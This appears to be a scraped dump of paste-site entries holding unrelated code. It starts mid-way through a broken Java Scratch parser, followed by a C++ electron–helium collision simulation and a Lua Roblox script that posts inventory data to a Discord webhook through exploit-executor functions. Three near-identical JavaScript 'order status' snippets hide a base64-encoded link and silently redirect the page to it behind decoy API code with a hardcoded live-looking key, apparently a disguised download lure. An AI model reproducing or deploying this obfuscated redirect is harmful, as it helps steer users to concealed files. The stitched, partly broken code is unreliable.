                int id =  array.getInt(0);
                switch (id) {
                    case 4:
                        double value = array.getDouble(1);
                        return new NumberBlock(value, false);
                    case 5:
                        double value = array.getDouble(1);
                        return new NumberBlock(value, true);
                    case 6:
                        int value = array.getInt(1);
                        return new NumberBlock(value, true);
                    case 7:
                        int value = array.getInt(1);
                        return new NumberBlock(value, false);
                    case 8:
                        int value = array.getInt(1);
                        return new AngleBlock(value);
                    case 9:
                        String value = array.getString(1);
                        Color color;
                        if (value.length() == 7) color = new Color(Integer.parseInt(value.substring(1), 16));
                        else if (value.length() == 9) {
                            int alpha = Integer.parseInt(value.substring(7), 16);
                            int r = Integer.parseInt(value.substring(1, 2), 16);
                            int g = Integer.parseInt(value.substring(3, 4), 16);
                            int b = Integer.parseInt(value.substring(5, 6), 16);
                            color = new Color(r, g, b, alpha);
                        } else break;
                        return new ColorBlock(color);
                    case 10:
                        String value = array.getString(1);
                        return new StringBlock(value);
                    case 11:
                        String name = array.getString(1);
                        String id = array.getString(2);
                        return new BroadcastBlock(name, id);
                    case 12:
                        String name = array.getString(1);
                        String id = array.getString(2);
                        return new VariableBlock(name, id);
                    case 13:
                        String name = array.getString(1);
                        String id = array.getString(2);
                        int x = array.getInt(3);
                        int y = array.getInt(4);
                        ScratchBlock block = new VariableBlock(name, id);
                        block.setPosition(x, y);
                        return block;
                }
            }
            JSONObject json = (JSONObject) o;
            ScratchBlockType<? extends ScratchBlock> type = ScratchBlockTypes.get(json.getString(""opcode""));
            Supplier<String> next = json.getString(""next"") == null || type.isFinal() || checkStopFinality(json) ? () -> null : () -> blocks[indexOf(json.getString(""next""), ids)];
            Supplier<String> parent = json.getString(""parent"") == null || json.getBoolean(""topLevel"") ? () -> null : () -> blocks[indexOf(json.getString(""parent""), ids)];
            ScratchBlockInput[] inputs = new ScratchBlockInput[json.getJSONObject(""inputs"").length()];
            Iterator<String> inputKeys = json.getJSONObject(""inputs"").keySet();
            int j = 0;
            while (inputKeys.hasNext()) {
                String next = inputKeys.next();
                inputs[j] = type.parseInput(next, json.getJSONObject(""inputs"").get(next));
                j++;
            }
            ScratchBlockInput[] fields = new ScratchBlockInput[json.getJSONObject(""fields"").length()];
            Iterator<String> fieldKeys = json.getJSONObject(""fields"").keySet();
            int j = 0;
            while (fieldKeys.hasNext()) {
                String next = fieldKeys.next();
                fields[j] = type.parseField(next, json.getJSONObject(""inputs"").get(next));
                j++;
            }
        boolean shadow = json.getBoolean(""shadow"");
        boolean topLevel = json.getBoolean(""topLevel"");
        if (type.hasMutations())
            return type.create(next, parent, inputs, fields, shadow, topLevel, type.createMutations(json.getJSONObject(""mutation"")));
        else
            return type.create(next, parent, inputs, fields, shadow, topLevel);
    }
    
    public static boolean checkStopFinality (JSONObject json) {
        if (!json.getString(""opcode"").equals(""control_stop"")) return false;
        return json.getJSONObject(""mutation"").getBoolean(""hasNext"");
    }
}

package com.sforzando.jscratch2.scratch.blocks;

import com.sforzando.jscratch2.scratch.blocks.ScratchBlock.Mutation;

public class ScratchBlockType<T extends ScratchBlock> {
    private final boolean isFinal;
    private final boolean hasMutations;
    
    private final String opcode;
    
    private final BlockBuilder<T> builder;
    
    public ScratchBlockType (String opcode, BlockBuilder<T> builder) {
        this.hasMutations = opcode.equals(""control_stop"") || opcode.equals(""procedures_call"") || opcode.equals(""procedures_prototype"");
        this.isFinal = opcode.equals(""control_forever"") || opcode.equals(""control_delete_this_clone"");
        this.opcode = opcode;
        this.builder = builder;
    }
    
    public boolean equals (Object other) {
        if (other.hashCode() == this.hashCode()) return true;
        if (other instanceof ScratchBlockType && other.opcode == this.opcode) return true;
        return false;
    }
    
    public boolean hasMutations () {
        return this.hasMutations;
    }
    
    public boolean isFinal () {
        return this.isFinal;
    }
    
    public Map<String, Object> createMutations (JSONObject obj) {
        if (this.opcode.equals(""control_stop"")) return Map.<String, Object>of(""isFinal"", Boolean.valueOf(!obj.getBoolean(""hasNext"")));
        if (this.opcode.equals(""procedures_call"") || this.opcode.equals(""procedures_prototype"")) {
            HashMap<String, Object> mutations = new HashMap<String, Object>();
            String signature = obj.getString(""proccode"");
            mutations.put(""name"", signature.replaceAll(""%b"", ""{}"").replaceAll(""%s"", ""{}""));
            char[] chars = signature.toCharArray();
            ArrayList<String> args = new ArrayList<String>();
            for (int i = 0; i < chars.length - 1; i++)
                if (chars[i] == '%') {
                    if (chars[i + 1] == 'b')
                        args.add(""<>"");
                    if (chars[i + 1] == 's')
                        args.add(""()"");
                }
            String[] matchedArgs = new String[args.size()];
            for (int i = 0; i < args.size(); i++)
                matchedArgs[i] = args.get(i).charAt(0) + new JSONArray(obj.getString(""argumentids"")).getString(i) + args.get(i).charAt(1);
            mutations.put(""arguments"", matchedArgs);
            mutations.put(""refreshScreen"", Boolean.valueOf(!obj.getBoolean(""warp"")));
            if (this.opcode.equals(""procedures_prototype"")) {
                String[] matchedNames = new String[args.size()];
                for (int i = 0; i < args.size(); i++)
                    matchedNames[i] = args.get(i).charAt(0) + new JSONArray(obj.getString(""argumentnames"")).getString(i) + args.get(i).charAt(1);
                mutations.put(""argumentNames"", matchedNames);
            }
            return mutations;
        }
        return null;
    }
    
    public ScratchBlockInput parseInputs (String type, Object obj) {
        if ((this.opcode.equals(""argument_reporter_string"") || this.opcode.equals(""argument_reporter_boolean"")) && type.equals(""VALUE""))
            return new SimpleStringBlockInput(((JSONArray) obj).getString(0));
        if ((this.opcode.equals(""argument_reporter_string"") || this.opcode.equals(""argument_reporter_boolean"")) && type.equals(""VALUE""))
            return new SimpleStringBlockInput(((JSONArray) obj).getString(0));
        
    }
    
    public ScratchBlockInput parseFields (String type, JSONObject json) {
    }
}"
4rD8uixk,Products.js,navrajkhunger,JavaScript,Wednesday 2nd of April 2025 03:21:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/169/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
A2b99pXi,e-n collisions(v9) clean,phystota,C++,Wednesday 2nd of April 2025 03:18:12 PM CDT,"#include <iostream>
#include <random>
#include <fstream>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota


#define n_e 100000
#define Emin 0.0
#define Emax 450.0
#define E_mean 100 // mean electron energy, initial distribution
#define bin_width 0.1 // keep energy step ~ this to maintain cross-section clarity (Ramsauer minimum etc)
#define m_e 9.1E-31 // electron mass in kg
#define k_b 1.38E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define N ( (int)((Emax-Emin)/bin_width) ) // add 1 to include E_max if needed?
#define T_n 10.0 // Helium neutral temperature in eV
#define T_e 50.0    // electron Maxwell initial distribution
#define M_n 6.6464731E-27 // Helium atom mass
#define N_He 1000000 // Helium neutrals number
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define time 6.0E-4 // 500 microsec time to equalibrate the system

// handling final energy bin

#define bin_width_smooth 1.0 // energy bin for smooth final distribution
#define N_smooth ( (int)((Emax-Emin)/bin_width_smooth) )

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided = false;

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};


struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& CS) {


    if (energy < CS.front().energy) {
        std::cout << "" required energy value lower than range of cross-section data"" << ""\n"";
        return 0.0;
    }
    if (energy > CS.back().energy) {
        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < CS.size() && energy > CS[step].energy) {
            step++;
        }

    double k = (CS[step].sigma - CS[step-1].sigma)/(CS[step].energy - CS[step-1].energy);
    double m = CS[step].sigma - k*CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};




int main() {

    clock_t start = clock();

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
    std::vector<NeutralParticle> neutrals(N_He); 


    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram

    std::vector<double> elastic_vec(N, 0); // precompiled elastic cross-section-energy vector
    std::vector<double> inelastic1_vec(N, 0); // precompiled inelastic(triplet excitation) cross-section-energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::uniform_int_distribution<int> pair(0, n_e-1);
    std::uniform_int_distribution<int> neutral_pair(0, N_He-1);    


    std::ifstream elastic_cs_dat(""cross_sections/elastic.dat"");
    if (!elastic_cs_dat.is_open()) {
        std::cerr << ""Error opening elastic cross-sections file!"" << std::endl;
        return 1;
    }    

    std::ifstream excitation1_cs_dat(""cross_sections/inelastic_triplet.dat"");
    if (!excitation1_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic triplet cross-sections file!"" << std::endl;
        return 1;
    }   

    // --- starts reading cross section datafiles

    std::vector<CrossSection> elastic_CS_temp;

    double energy, sigma;

    while (elastic_cs_dat >> energy >> sigma) {
        elastic_CS_temp.push_back({energy, sigma});
    }    
    elastic_cs_dat.close();

    energy = 0.0;
    sigma = 0.0;

    std::vector<CrossSection> inelastic1_CS_temp;

    while (excitation1_cs_dat >> energy >> sigma) {
        inelastic1_CS_temp.push_back({energy, sigma});
    }    
    excitation1_cs_dat.close();    

    // --- finish reading cross-section datafiles  

    std::ofstream file0(""output_files/velocities.dat"");    
    std::ofstream file1(""output_files/energies.dat"");        
    std::ofstream file2(""output_files/energies_final.dat"");    
    std::ofstream file3(""output_files/histo_random.dat"");    
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""output_files/histo_maxwell.dat"");
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""output_files/neutral_distribution.dat"");    
    std::ofstream file6(""output_files/E*f(E).dat"");    
    std::ofstream file7(""output_files/nu_max.dat"");
    std::ofstream file8(""output_files/electron_mean_energy.dat"");
    std::ofstream file9(""output_files/nu_elastic_average_initial.dat"");
    std::ofstream file10(""output_files/nu_inelastic1_average_initial.dat"");
    std::ofstream file11(""output_files/nu_elastic_average_final.dat"");
    std::ofstream file12(""output_files/nu_inelastic1_average_final.dat"");                    

    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis, maxwell_electron);
    }
    // initialize all nenutrals
    for (auto&n : neutrals) {
        n.initialize(gen, dis, maxwell_neutral);
    }
    // precalculate elastic cross-section for each energy bin
    for (int i = 0; i < N; i++){
        elastic_vec[i] = interpolate(bin_width*(i+0.5), elastic_CS_temp);
    }
    // precalculate inelastic cross-section (triplet) for each energy bin
    for (int i = 0; i < N; i++){
        inelastic1_vec[i] = interpolate(bin_width*(i+0.5), inelastic1_CS_temp);
    }

    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }

    // -----initial electrons energy distribution starts------------////
    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file3 << bin_center << "" "" <<  static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // this is electron normalized distribution function
    }
    // -----initial electrons energy distribution ends------------////    

    // -----neutrals Maxwell-Boltzmann distribution starts------------////
    for (int i = 0; i < N_He; i++){
        int bin = (int)( (neutrals[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_neutral.size())
            histo_neutral[bin]++;
    }    

    for (int i = 0; i < histo_neutral.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file5 << bin_center << "" "" << static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this is real f(E) - normalized distribution
        file6 << bin_center << "" "" << bin_center*static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this should be E*f(E) 

    }
    // -----neutrals Maxwell-Boltzmann distribution starts------------////       

    // -----calculating nu-max for null-collision method starts ------------////
    double nu_max = 0.0;
    double nu_max_temp = 0.0;
    double sigma_total = 0.0;
    
    for (int i = 0; i < N; i++){
        sigma_total = elastic_vec[i] + inelastic1_vec[i];
        nu_max_temp = (N_He/Volume)*sigma_total * sqrt(2.0*(i*bin_width + bin_width/2.0)*q/m_e);
        file7 << i << "" "" << nu_max_temp << ""\n"";
        if (nu_max_temp > nu_max)
            nu_max = nu_max_temp;
    }
    // -----calculating nu-max for null-collision method ends ------------////

    //----- calculating number to calculate nu-average (both elastic/inelastic )from our electron distribution starts---------///
    // --- calculating nu(E)*f(E) for later external integration, using initial f(E)
    for (int i = 0; i < N; i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file9 << bin_center << "" "" << (N_He/Volume)*elastic_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
        file10 << bin_center << "" "" << (N_He/Volume)*inelastic1_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
    }
    //----- calculating nu-average from our electron distribution ends ---------///    

    std::cout << nu_max << ""\n"";

    double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    double steps = static_cast<int>(time/dt);

//    std::cout << steps << ""\n"";

    //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
    int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;
//    int Ne_collided = n_e*0.98;  // in case I want to check smth


    // Generate shuffled list of electron indices
    std::vector<int> electron_indices(n_e);
    std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index
    std::shuffle(electron_indices.begin(), electron_indices.end(), gen); // shuffle the indexes    
    int reshuffle_interval = 1;
    int print_interval = 100;
    int el_coll_counter = 0; // track all elastic collisions
    int exc1_coll_counter = 0; // track all excitation collisions
    int null_coll_counter = 0; // track null-collisions

    for (int t = 0; t < steps; t++){
        std::cout << ""timestep remains: "" << steps - t << ""\n"";

        //reshuffle the indices
        if (t % reshuffle_interval == 0) {
            std::shuffle(electron_indices.begin(), electron_indices.end(), gen);
        }

        // setting flags to false each timestep
        for (auto& e : electrons) e.collided = false;

        int collision_counter = 0;


        for (int idx : electron_indices) {

            if (collision_counter >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided) continue;  // Skip already collided electrons

            double electron_energy = e.energy;
            int bin_energy = static_cast<int>(electron_energy / bin_width);
            double nu_elastic = (N_He/Volume) * elastic_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_inelastic1 = (N_He/Volume) * inelastic1_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);

            double r = dis(gen);

            if (r < nu_elastic/nu_max) {

                // elastic collision happens

                // ----   Collision energy redistribution module

                // electron particle X Y Z initial velocities and energy
                double V0_x_1 = e.vx;
                double V0_y_1 = e.vy;
                double V0_z_1 = e.vz;

                // neutral particle X Y Z initial velocities

                // int k = neutral_pair(gen);

                // double V0_x_2 = neutrals[k].vx;
                // double V0_y_2 = neutrals[k].vy;
                // double V0_z_2 = neutrals[k].vz;

                // randomize particles each collision
                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V0_x_2 = tmp_neutral.vx;
                double V0_y_2 = tmp_neutral.vy;
                double V0_z_2 = tmp_neutral.vz;

                // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

                double V0_rel_x = (V0_x_1 - V0_x_2);
                double V0_rel_y = (V0_y_1 - V0_y_2);
                double V0_rel_z = (V0_z_1 - V0_z_2);

                double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

                // center-of-mass frame initial velocity (magnitude of it must be equal to the counterpart in this frame)

                double V_cm_x = (m_e*V0_x_1 + M_n*V0_x_2)/(m_e + M_n);
                double V_cm_y = (m_e*V0_y_1 + M_n*V0_y_2)/(m_e + M_n);
                double V_cm_z = (m_e*V0_z_1 + M_n*V0_z_2)/(m_e + M_n);                    

                // generating random variables to calculate random direction of center-of-mass after the collision

                double R1 = dis(gen);
                double R2 = dis(gen);

                // calculating spherical angles for center-of-mass random direction
                double theta = acos(1.0- 2.0*R1);
                double phi = 2*M_PI*R2;

                //calculating final relative velocity with random direction

                double V_rel_x = V0_rel*sin(theta)*cos(phi);
                double V_rel_y = V0_rel*sin(theta)*sin(phi);
                double V_rel_z = V0_rel*cos(theta);

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                //calculating final velocity of electron

                double V_x_1 = V_cm_x + V_rel_x * (M_n/(m_e + M_n));
                double V_y_1 = V_cm_y + V_rel_y * (M_n/(m_e + M_n));
                double V_z_1 = V_cm_z + V_rel_z * (M_n/(m_e + M_n));

                double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

                //updating electron energy and velocities
                
                e.energy = m_e*V_1*V_1/(2.0*q);
                e.vx = V_x_1;
                e.vy = V_y_1;
                e.vz = V_z_1;

                collision_counter++;
                el_coll_counter++;

                e.collided = true;
            }        

            else if (r < (nu_elastic + nu_inelastic1)/nu_max) {

                //inelastic 1(triplet) collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities
 
                double delta_E = 19.82; //triplet excitation energy               
                
                if (e.energy < delta_E) {
                    null_coll_counter++;
                    collision_counter++;
                    e.collided = true;
                    continue;
                }
                else {
                    e.energy = E_0 - delta_E;
 
                    double speed = sqrt(2*e.energy*q/m_e);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter++;   
                    exc1_coll_counter++;
 
                    e.collided = true;
                }
            }     

            else {
                collision_counter++;
                null_coll_counter++;
                e.collided = true;
            }
        }
                // calculating mean energy 
                double total_energy = 0.0;
                for (const auto& e : electrons) total_energy += e.energy;
                double mean_energy = total_energy / n_e;
                file8 << t*dt << "" "" << mean_energy << ""\n"";                
    }

    // ----- final electron energies distribution begins
    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = (int)( (electrons[i].energy - Emin)/bin_width_smooth );
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < histo_maxwell.size(); i++){
        check += histo_maxwell[i];
        double bin_center = Emin + (i + 0.5) * bin_width;
        file4 << bin_center << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // getting f(E)
    }

    //recalculating average frequencies to adjust validation constants later
    for (int i = 0; i < histo_maxwell.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file11 << bin_center << "" "" << (N_He/Volume)*elastic_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n"";
        file12 << bin_center << "" "" << (N_He/Volume)*inelastic1_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n"";
    }
    //----- calculating nu-average from our electron distribution ends ---------///        


        std::cout << ""Total # of electrons in a final histogram: "" << check << ""\n"";

    // ----- final electron energies distribution begins    


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();
    file8.close();
    file9.close();
    file10.close();
    file11.close();
    file12.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""# of steps: "" << steps << ""\n"";
    std::cout << ""# of electrons collided each timesteps:"" << Ne_collided << ""\n"";

    std::cout << ""Average triplet excitation collsisions per timestep: "" << exc1_coll_counter/steps << ""\n"";
    std::cout << ""Average elastic collsisions per timestep: "" << el_coll_counter/steps << ""\n"";
    std::cout << ""Average null collsisions per timestep: "" << null_coll_counter/steps << ""\n"";

    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
Tvkyg8sw,Tracker,Ghost_Deba,Lua,Wednesday 2nd of April 2025 03:07:47 PM CDT,"local Client = game:GetService('ReplicatedStorage').Library.Client
local Players = game:GetService(""Players"")
local HttpService = game:GetService(""HttpService"")
local SaveModule = require(Client.Save)

--═══════ الإعدادات الثابتة ═══════--
local CUSTOM_USERNAME = ""Tracker""
local CUSTOM_AVATAR = ""https://cdn.discordapp.com/attachments/905256599906558012/1356371225714102324/IMG_1773.jpg?ex=67ee4ce4&is=67ecfb64&hm=762cc5bd771fc9dffc9f286792a40d86f28c00c358f398f9bc81f06d337c9dc5&""
local FOOTER_ICON = ""https://cdn.discordapp.com/attachments/905256599906558012/1356371225714102324/IMG_1773.jpg?ex=67ee4ce4&is=67ecfb64&hm=762cc5bd771fc9dffc9f286792a40d86f28c00c358f398f9bc81f06d337c9dc5&""

--═══════ ترتيب الجواهر ═══════--
local GEMS_ORDER = {
    ""Onyx Gem"",
    ""Topaz Gem"",
    ""Quartz Gem"",
    ""Rainbow Gem"",
    ""Amethyst Gem"",
    ""Emerald Gem""
}

--═══════ دالة جمع البيانات ═══════--
local function getPlayerData()
    local data = SaveModule.Get()
    return {
        Gems = {
            [""Onyx Gem""] = 0,
            [""Topaz Gem""] = 0,
            [""Quartz Gem""] = 0,
            [""Rainbow Gem""] = 0,
            [""Amethyst Gem""] = 0,
            [""Emerald Gem""] = 0
        },
        Diamonds = data.Diamonds or data.diamonds or data.Currency.Diamonds or 0,
        Username = Players.LocalPlayer.Name
    }
end

--═══════ دالة تحديث الإنفنتوري ═══════--
local function updateInventory(playerData)
    local inventory = SaveModule.Get().Inventory or {}
    for _, category in pairs(inventory) do
        for _, item in pairs(category) do
            if playerData.Gems[item.id] ~= nil then
                playerData.Gems[item.id] = item._am or 1
            end
        end
    end
end

--═══════ دالة إنشاء رسالة الويب هوك ═══════--
local function createWebhookMessage()
    local playerData = getPlayerData()
    updateInventory(playerData)
    local currentTime = os.date(""%Y/%m/%d %H:%M:%S"")
    
    local gemsText = """"
    for _, gemName in ipairs(GEMS_ORDER) do
        gemsText = gemsText .. ""> "" .. gemName .. "" : `"" .. playerData.Gems[gemName] .. ""` \n""
    end
    
    return {
        username = CUSTOM_USERNAME,
        avatar_url = CUSTOM_AVATAR,
        embeds = {{
            title = ""Inventory Tracker"",
            description = ""**Inventory Info**\n"" .. gemsText,
            color = 0x3498db,
            fields = {
                {
                    name = ""User Info"",
                    value = ""> Diamond Left : `"" .. playerData.Diamonds .. ""` \n"" ..
                            ""> Account : ||"" .. playerData.Username .. ""||"",
                    inline = false
                }
            },
            footer = {
                text = ""Ｇんｏｓｔ • Tracker"",
                icon_url = FOOTER_ICON
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }
end

--═══════ دالة إرسال الويب هوك ═══════--
local function sendWebhook()
    local message = createWebhookMessage()
    local success, response = pcall(function()
        local requestFunc = syn and syn.request or http_request or game.HttpPostAsync
        return requestFunc({
            Url = getgenv().TrackerConfig.WebhookUrl, -- استخدام القيمة من getgenv()
            Method = ""POST"",
            Headers = {
                [""Content-Type""] = ""application/json""
            },
            Body = HttpService:JSONEncode(message)
        })
    end)
    
    if success then
        print(""["" .. os.date(""%H:%M:%S"") .. ""] Send Done :white_check_mark:"")
    else
        warn(""["" .. os.date(""%H:%M:%S"") .. ""] Send False :x::"", response)
    end
end

--═══════ التشغيل التلقائي ═══════--
while wait(getgenv().TrackerConfig.UpdateInterval) do -- استخدام القيمة من getgenv()
    sendWebhook()
end"
KVp3Rvjm,Market.js,navrajkhunger,JavaScript,Wednesday 2nd of April 2025 02:51:06 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/316/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
haQmSafX,Untitled,navrajkhunger,JavaScript,Wednesday 2nd of April 2025 02:35:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/163/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
